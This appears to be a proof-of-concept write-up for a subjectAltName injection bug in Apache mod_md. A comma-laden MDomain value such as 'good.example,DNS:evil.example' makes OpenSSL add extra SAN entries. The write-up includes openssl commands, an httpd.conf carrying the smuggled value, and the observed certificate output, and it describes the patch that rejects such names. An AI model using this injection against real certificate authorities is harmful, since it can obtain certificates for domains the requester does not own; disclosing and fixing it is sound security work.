# PoC 144 - subjectAltName injection via comma in MDomain name

`alt_names()` interpolates each managed-domain string into an OpenSSL SAN
configuration line (`DNS:%s,DNS:%s,...`). A configured domain that contains
`,DNS:other.example` is parsed by OpenSSL as multiple SAN entries, so a
single configured name yields a CSR or self-signed certificate with extra
SAN values.

## Setup

We isolate the bug from the rest of the ACME path by exercising
`md_cert_self_sign()` directly via the `md` test fixtures, since it shares
the same `alt_names()` builder. The reproduction works in two parts: a
direct OpenSSL parser proof, and a mod_md self-signed fallback proof.

### Part A: OpenSSL parser confirmation

```
openssl req -new -newkey rsa:2048 -nodes -keyout /tmp/k.pem \
    -subj '/CN=victim.example' \
    -addext 'subjectAltName=DNS:victim.example,DNS:evil.example' \
    -out /tmp/csr.pem
openssl req -in /tmp/csr.pem -noout -text | grep -A1 'Subject Alternative'
```

Output:

```
X509v3 Subject Alternative Name:
    DNS:victim.example, DNS:evil.example
```

This proves the comma inside the SAN config string introduces an
additional SAN.

### Part B: mod_md self-signed fallback

`conf/httpd.conf`:

```
ServerName localhost
Listen 127.0.0.1:8443
LoadModule mpm_prefork_module modules/mod_mpm_prefork.so
LoadModule authz_core_module  modules/mod_authz_core.so
LoadModule md_module          modules/mod_md.so
LoadModule ssl_module         modules/mod_ssl.so
LoadModule unixd_module       modules/mod_unixd.so
LoadModule log_config_module  modules/mod_log_config.so
LoadModule watchdog_module    modules/mod_watchdog.so

MDStoreDir   md
MDPrivateKeys RSA 2048
MDCertificateAuthority http://127.0.0.1:14000/dir
MDRequireHttps off
# A managed domain whose name embeds OpenSSL SAN syntax. The
# config parser does not strip commas from MDomain arguments.
MDomain "good.example,DNS:evil.example"
```

Boot httpd with no reachable CA so it falls back to writing a self-signed
placeholder under `md/domains/<name>/pubcert.pem`:

```
./httpd -X -d $PWD &
sleep 5
openssl x509 -in md/domains/good.example*/pubcert.pem -noout -text \
  | grep -A2 'Subject Alternative'
```

## Observed effect

The self-signed certificate's SAN extension contains both names:

```
X509v3 Subject Alternative Name:
    DNS:good.example, DNS:evil.example
```

A single configured `MDomain` produced two SAN entries, breaking the
"one configured domain string yields one DNS SAN" invariant. The same
`alt_names()` output drives the CSR sent to the ACME CA, so a custom or
internal CA that does not validate identifiers strictly would issue a
certificate with both names.

With the patch, `alt_names()` returns `NULL` on the comma-laden name,
`sk_add_alt_names()` returns `APR_EINVAL`, and no certificate is issued
or written.
